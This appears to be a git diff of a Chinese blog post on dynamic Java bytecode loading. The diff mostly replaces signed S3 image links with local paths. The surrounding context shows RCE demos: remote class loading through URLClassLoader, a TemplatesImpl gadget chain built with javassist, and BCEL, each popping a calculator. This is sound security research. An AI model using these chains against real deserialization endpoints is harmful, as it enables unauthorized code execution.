@@ -8,7 +8,7 @@ updated: 2023-03-12T00:00:00+00:00
 date: 2023-01-10T00:00:00+00:00
 slug: java-classloader
 title: Java中动态加载字节码的几种方法
-cover: https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/f5bb80f3-6c79-49d3-b4c7-530f0513f323/9.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050157Z&X-Amz-Expires=3600&X-Amz-Signature=96583a270f59fec2a40e7690f20786833869539e40757dd3b3c5c684df4b9510&X-Amz-SignedHeaders=host&x-id=GetObject
+cover: /img/post/java-classloader/0.png
 id: 113906e1-7468-808f-ae02-d6a52be77db1
 ---
 
@@ -146,11 +146,9 @@ public class DefineClassRCE {
 }
 ```
 
-![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/22a09c0d-456b-4917-84dd-13b5f24ee6a8/0.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=6d98bac01638cdf26d6e01c5df0ff3ade313946f55191b3163b1825584189289&X-Amz-SignedHeaders=host&x-id=GetObject)
+![](/img/post/java-classloader/0.png)
 
-![](../img/post/java-classloader/1.png)
-
-![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/a3376a1b-f9c9-4ff5-b576-f63ab0d5f943/1.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=b1d1384d38b5adb4a33a2b0383a79910571ce96d3d576459a17d1880c1854fb5&X-Amz-SignedHeaders=host&x-id=GetObject)
+![](/img/post/java-classloader/1.png)
 
 ## URLClassLoader
 
@@ -203,7 +201,7 @@ public class URLClassLoaderRCE {
     public static void main(String[] args) throws Exception {
 
         // 定义远程加载的URL
-        URL url = new URL("<http://192.168.1.101:9999/>");
+        URL url = new URL("http://192.168.1.101:9999/");
 
         // 创建URLClassLoader对象
         URLClassLoader loader = new URLClassLoader(new URL[]{url});
@@ -289,7 +287,7 @@ protected Class<?> findClass(final String name) throws ClassNotFoundException {
 }
 ```
 
-![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/32c3f717-3f43-4371-a081-056e0bd233da/2.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=43156f3c4ea3801d18230f8821af42eec578816f77f2a6ee3102c5127eb7747f&X-Amz-SignedHeaders=host&x-id=GetObject)
+![](/img/post/java-classloader/2.png)
 
 而 findClass 中又对 defineClass 方法进行了调用，该方法用于将一个字节数组表示的类定义转换为一个 Class 对象。
 
@@ -303,7 +301,7 @@ protected final Class<?> defineClass(String name, byte[] b, int off, int len, Pr
 }
 ```
 
-![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/25213d6d-7952-49f6-bba8-bebbd3a29219/3.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=48abbfce9a994e69b9500ad01b64f63771804e1ea19f4c66b0e0c52fe6550146&X-Amz-SignedHeaders=host&x-id=GetObject)
+![](/img/post/java-classloader/3.png)
 
 最终，Web 服务器将接收到一个请求，计算器也成功弹出。
 
@@ -359,11 +357,11 @@ static final class TransletClassLoader extends ClassLoader {
 
 那么，便对 TransletClassLoader 类进行 Find Usages，可看到它在 TemplatesImpl#defineTransletClasses 方法中存在被调用。
 
-![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/74925742-fa68-48c2-aa65-3b15bc9b2c91/4.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=bea9ab923d7b10c37890d57c9e004092c4c14ae1f5d9d8014497c4557e5e67d5&X-Amz-SignedHeaders=host&x-id=GetObject)
+![](/img/post/java-classloader/4.png)
 
 但由于 defineTransletClasses 方法的访问修饰符为 private，所以需继续向前 Find Usages。
 
-![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/f0458c3d-45eb-4355-8c29-a4d5f99e7b33/5.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=b47731a6c191acb26bdf2533b8401cce7874a7ecba710bc592e616ce5b8a6fdf&X-Amz-SignedHeaders=host&x-id=GetObject)
+![](/img/post/java-classloader/5.png)
 
 在 getTransletClasses、getTransletIndex 和 getTransletInstance 三个方法中发现存在 defineTransletClasses 方法的调用，且 getTransletIndex 的访问修饰符是 public，但是 getTransletIndex 是行不通的，原因后面再说。
 
@@ -518,7 +516,7 @@ public class RCE extends AbstractTranslet {
 javac RCE.java && cat RCE.class | base64 | pbcopy
 ```
 
-![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/b6e805e5-f33a-43fb-8cc5-44e462d6db70/6.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=b632fddfb9ba73df1cef9168f2990dbb188ec02863196d1a272a9497dcfef037&X-Amz-SignedHeaders=host&x-id=GetObject)
+![](/img/post/java-classloader/6.png)
 
 当然，还可以通过使用 javassist 将 RCE 生成字节码的方式。如下，运行后依旧弹出计算器。
 
@@ -545,7 +543,7 @@ public class TemplatesImplRCE2 {
 
         clas.setSuperclass(pool.get(AbstractTranslet.class.getName()));
 
-        String cmd = "Runtime.getRuntime().exec(\\"open -a Calculator\\");";
+        String cmd = "Runtime.getRuntime().exec(\"open -a Calculator\");";
 
         CtConstructor constructor = clas.makeClassInitializer();
         constructor.insertBefore(cmd);
@@ -589,7 +587,7 @@ public class TemplatesImplRCE2 {
 }
 ```
 
-![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/83649ca0-3508-4a70-9f5a-d8973393cc1e/7.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=bacf7b66617c7eef0050f217c98a1938a40d2538ceae843d3ba7534db8ebdd74&X-Amz-SignedHeaders=host&x-id=GetObject)
+![](/img/post/java-classloader/7.png)
 
 如上使用的完整利用链为 newTransformer()—>getTransletInstance()—>defineTransletClasses()—>TransletClassLoader，如果继续对 newTransformer 方法进行 Find Usages，会发现它在 getOutputProperties 方法中有被调用，getOutputProperties 方法的访问修饰符为 public，完全满足利用条件，这相当于有两种不同的利用链实现，虽然两者存在重叠，但依旧能够扩展在实际利用中的多样性和可能性，譬如在 CommonsBeanutils1、Fastjson 反序列化利用中就会用到 getOutputProperties，而非直接用到 newTransformer。
 
@@ -597,7 +595,7 @@ public class TemplatesImplRCE2 {
 getOutputProperties()—>newTransformer()—>getTransletInstance()—>defineTransletClasses()—>TransletClassLoader
 ```
 
-![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/ffa4b215-d28b-4e9a-8d47-e4c15e4d8c6f/8.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=5848fc1b7622cd96c2f34220d1c85c352013e27304cdac19ebde9410b1b5851f&X-Amz-SignedHeaders=host&x-id=GetObject)
+![](/img/post/java-classloader/8.png)
 
 ## BCEL
 
@@ -642,16 +640,16 @@ public class BCELRCE {
 
 最终执行如上程序后便会弹出计算器。
 
-![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/a8fdf36c-21fa-40b5-8ddb-d9d56217c7e3/9.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=5095a4b8c1bec7342c3b244381c03c08a4416d06292d06a6ef76c10703964ede&X-Amz-SignedHeaders=host&x-id=GetObject)
+![](/img/post/java-classloader/9.png)
 
 BCEL 在 Java 8u251 及之后的版本中无法使用，这是由于在后续的版本中 com.sun.org.apache.bcel.internal.util.ClassLoader 已被移除。
 
 ## 参考
 
-[https://xalan.apache.org/](https://xalan.apache.org/)
+https://xalan.apache.org/
 
-[https://commons.apache.org/proper/commons-bcel/](https://commons.apache.org/proper/commons-bcel/)
+https://commons.apache.org/proper/commons-bcel/
 
-[https://www.javasec.org/javase/ClassLoader/](https://www.javasec.org/javase/ClassLoader/)
+https://www.javasec.org/javase/ClassLoader/
 
-[https://github.com/phith0n/JavaThings/](https://github.com/phith0n/JavaThings/)
+https://github.com/phith0n/JavaThings/
